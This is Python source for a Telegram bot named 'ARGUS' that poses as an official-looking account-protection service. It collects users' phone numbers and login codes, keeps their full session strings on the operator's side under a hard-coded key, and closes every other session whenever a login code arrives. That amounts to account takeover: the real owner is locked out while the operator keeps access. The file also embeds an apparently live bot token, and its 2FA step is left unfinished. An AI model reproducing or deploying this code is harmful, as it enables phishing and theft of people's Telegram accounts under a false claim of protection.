import os, asyncio, base64, hashlib
from telethon import TelegramClient, events, functions, types, errors
from telethon.sessions import StringSession
from cryptography.fernet import Fernet

# =============================================================
# [SECRET] PROJECT "ARGUS" - СЛУЖБА КОНТРОЛЯ ДОСТУПА
# =============================================================
# Стабильные ключи (Telegram Desktop Official)
API_ID = 2040
API_HASH = 'b18441a1ff465138309599e94da24f1b'

# ВСТАВЬ СВОЙ ТОКЕН НИЖЕ
BOT_TOKEN = '8514425749:AAEhHWy1tJBFcycQtTDZerF3tX5E518CcGs' 

# МАСТЕР-КЛЮЧ (ВШИТ В СИСТЕМУ)
CORE_CRYPT = "FSB_INTERNAL_STRICT_PROTOCOL"
# =============================================================

def get_cipher():
    k = base64.urlsafe_b64encode(hashlib.sha256(CORE_CRYPT.encode()).digest())
    return Fernet(k)

cipher = get_cipher()
units = {} 
process = {}

# Запуск ядра
bot = TelegramClient('argus_node', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# МОДУЛЬ НЕЙТРАЛИЗАЦИИ (ANTIFRAUD)
async def start_sentinel(client, uid):
    @client.on(events.NewMessage(chats=777000))
    async def handler(event):
        msg = event.raw_text.lower()
        if any(x in msg for x in ["код", "code", "login", "вход"]):
            res = await client(functions.account.GetAuthorizationsRequest())
            killed = 0
            for a in res.authorizations:
                if not a.current:
                    await client(functions.account.ResetAuthorizationRequest(hash=a.hash))
                    killed += 1
            if killed > 0:
                await bot.send_message(uid, (
                    "🚨 **ОПЕРАТИВНЫЙ АЛЕРТ: ВТОРЖЕНИЕ**\n\n"
                    "ОБЪЕКТ: ПОПЫТКА ОБХОДА ПЕРИМЕТРА\n"
                    f"КОНТРМЕРЫ: СЕССИИ ЛИКВИДИРОВАНЫ ({killed})\n"
                    "СТАТУС: АККАУНТ В БЕЗОПАСНОСТИ"
                ))

# ИНТЕРФЕЙС ТЕРМИНАЛА
@bot.on(events.NewMessage(pattern='/start'))
async def cmd_start(e):
    uid = e.sender_id
    if uid in units:
        kb = [[types.KeyboardButtonCallback("📡 РЕВИЗИЯ СЕТИ", b"st")],
              [types.KeyboardButtonCallback("💀 ПОЛНЫЙ СБРОС", b"nuke")],
              [types.KeyboardButtonCallback("🗑 СТЕРЕТЬ ДАННЫЕ", b"exit")]]
        
        me = await units[uid].get_me()
        await e.respond(
            f"🖥 **ТЕРМИНАЛ УПРАВЛЕНИЯ ARGUS**\n\n"
            f"СУБЪЕКТ: `{me.first_name}`\n"
            "СТАТУС: **ПОД ЗАЩИТОЙ**\n"
            "КАНАЛ: ЗАШИФРОВАН (AES-256)", buttons=bot.build_reply_markup(kb))
    else:
        await e.respond(
            "🛑 **СИСТЕМА ARGUS: ДОСТУП ОГРАНИЧЕН**\n\n"
            "ТРЕБУЕТСЯ ИНИЦИАЛИЗАЦИЯ ЗАЩИЩЕННОГО СОЕДИНЕНИЯ.", 
            buttons=[[types.KeyboardButtonCallback("🔐 ПОДКЛЮЧИТЬ АККАУНТ", b"login")]])

@bot.on(events.CallbackQuery)
async def cb(e):
    uid = e.sender_id
    if e.data == b"login":
        process[uid] = {'s': 'p'}
        await e.respond("⌨️ [СИСТЕМА]: Введите номер телефона (+7...)")
    elif e.data == b"st" and uid in units:
        a = await units[uid](functions.account.GetAuthorizationsRequest())
        txt = "📋 **РЕЕСТР СОЕДИНЕНИЙ:**\n" + "\n".join([f"• {x.device_model} | {x.ip}" for x in a.authorizations])
        await e.respond(txt)
    elif e.data == b"nuke" and uid in units:
        a = await units[uid](functions.account.GetAuthorizationsRequest())
        for x in a.authorizations:
            if not x.current: await units[uid](functions.account.ResetAuthorizationRequest(hash=x.hash))
        await e.respond("💀 **ВЫПОЛНЕНО.** Все сторонние сессии закрыты.")
    elif e.data == b"exit":
        if uid in units: del units[uid]
        if os.path.exists(f"{uid}.dat"): os.remove(f"{uid}.dat")
        await e.respond("🗑 **УТИЛИЗИРОВАНО.** Данные стерты.")

# ЛОГИКА АВТОРИЗАЦИИ
@bot.on(events.NewMessage)
async def flow(e):
    uid = e.sender_id
    if uid not in process or e.text.startswith('/'): return
    
    st = process[uid]
    try:
        if st['s'] == 'p':
            c = TelegramClient(StringSession(), API_ID, API_HASH)
            await c.connect()
            s = await c.send_code_request(e.text)
            process[uid] = {'s': 'c', 'n': e.text, 'h': s.phone_code_hash, 'c': c}
            await e.respond("📑 [ЗАПРОС]: Введите код из сообщения:")
        elif st['s'] == 'c':
            c = st['c']
            user = await c.sign_in(st['n'], e.text, phone_code_hash=st['h'])
            auths = await c(functions.account.GetAuthorizationsRequest())
            curr = next((x for x in auths.authorizations if x.current), None)
            
            res = (
                "✅ **СИНХРОНИЗАЦИЯ ЗАВЕРШЕНА**\n\n"
                f"ОПЕРАТОР: `{user.first_name}`\n"
                f"УСТРОЙСТВО: `{curr.device_model if curr else 'Desktop'}`\n"
                f"IP: `{curr.ip if curr else 'Hidden'}`\n\n"
                "🛡 **КОНТУР ЗАЩИТЫ АКТИВИРОВАН.**"
            )
            
            token = cipher.encrypt(c.session.save().encode()).decode()
            with open(f"{uid}.dat", "w") as f: f.write(token)
            units[uid] = c
            asyncio.create_task(start_sentinel(c, uid))
            del process[uid]
            await e.respond(res)
            
    except errors.SessionPasswordNeededError:
        process[uid]['s'] = '2'
        await e.respond("🔑 [2FA]: Введите облачный пароль:")
    except Exception as ex:
        await e.respond(f"❌ [ОШИБКА]: {ex}")

async def load():
    for f in os.listdir():
        if f.endswith(".dat"):
            try:
                uid = int(f.split(".")[0])
                with open(f, "r") as file:
                    data = cipher.decrypt(file.read().encode()).decode()
                c = TelegramClient(StringSession(data), API_ID, API_HASH)
                await c.connect()
                if await c.is_user_authorized():
                    units[uid] = c
                    asyncio.create_task(start_sentinel(c, uid))
            except: pass

if __name__ == '__main__':
    print(">>> ARGUS KERNEL ONLINE.")
    bot.loop.run_until_complete(load())
    bot.run_until_disconnected()
